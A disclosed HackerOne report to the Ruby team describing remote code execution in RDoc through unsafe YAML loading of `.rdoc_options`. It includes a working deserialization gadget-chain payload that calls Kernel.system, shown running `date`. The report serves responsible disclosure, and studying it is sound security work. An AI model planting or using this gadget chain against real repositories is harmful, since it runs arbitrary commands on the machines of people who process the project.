# RCE by parsing `.rdoc_options` in RDoc

## Report Details
- **Report ID**: 1187477
- **URL**: https://hackerone.com/reports/1187477
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2021-05-07T04:58:55.067Z
- **Disclosed**: 2024-07-03T00:01:01.915Z

## Reporter
- **Username**: ooooooo_q
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ruby

## Vulnerability Information
When parsing `.rdoc_options` used for configuration in RDoc as a YAML file, RCE is possible from Object injection because there are no restrictions on the classes that can be restored.

https://github.com/ruby/rdoc/blob/v6.3.0/lib/rdoc/rdoc.rb#L165

```ruby
  def load_options
    options_file = File.expand_path '.rdoc_options'
    return RDoc::Options.new unless File.exist? options_file

    RDoc.load_yaml

    begin
      options = YAML.load_file '.rdoc_options'
    rescue Psych::SyntaxError
    end
```

### PoC

```
$ rdoc -v
6.3.1
```

Create `.rdoc_options` file. The yaml attack code is based on this article [Universal RCE with Ruby YAML.load](https://staaldraad.github.io/post/2019-03-02-universal-rce-ruby-yaml-load/), https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565

```yaml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: date
         method_id: :resolve
```

```
$ rdoc
sh: reading: command not found
2021年 5月 7日 金曜日 13時34分42秒 JST
uh-oh! RDoc had a problem:
no implicit conversion of nil into String
```

Kernel.system is called and `date` is executed.

## Impact

RCE is possible when the `rdoc` command is executed for a repository received from the external.

I also tried building the gem with the `.rdoc_options` file.
When running with `gem rdoc`, the file `.rdoc_options` doesn't seem to be read and seems safe.
Therefore, it seems that the environment where RCE is actually possible is limited.

## Attachments
No attachments
